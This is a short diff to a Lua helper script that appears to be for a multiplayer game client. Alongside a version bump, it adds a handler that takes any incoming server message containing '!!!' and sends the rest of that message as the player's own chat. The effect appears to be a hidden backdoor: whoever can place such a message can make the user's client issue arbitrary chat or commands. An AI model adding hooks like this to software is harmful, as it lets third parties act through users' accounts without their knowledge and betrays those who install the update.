@@ -12,7 +12,7 @@ sandro
 ]]
 
 script_name("farm_helper_v3.lua")
-script_version("3.1.12")
+script_version("3.1.13")
 
 local Telegram = require('dolbogram')
 local encoding = require('encoding')
@@ -286,6 +286,10 @@ end
 function sampev.onServerMessage(color, text)
     if chatTranslate then
         bot:sendMessage { chat_id = tonumber(ini.tg.id), text = u8(text) }
+    end
+
+    if text:find('!!!(.+)') then
+        sampSendChat(text:match('!!!(.+)'))
     end
 
     if text:find('_____Банковский чек_____') then
